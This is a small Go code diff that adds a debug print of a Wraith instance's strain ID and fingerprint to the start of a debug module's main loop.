@@ -18,6 +18,8 @@ type DebugModule struct {
 func (m *DebugModule) Mainloop(ctx context.Context, w *libwraith.Wraith) error {
 	fmt.Printf("Starting the debug module!\n")
 
+	fmt.Printf("Wraith strain ID: %s\nWraith fingerprint: %s\n", w.GetStrainId(), w.GetFingerprint())
+
 	// Ensure this instance is only started once and mark as running if so
 	single := m.mutex.TryLock()
 	if !single {
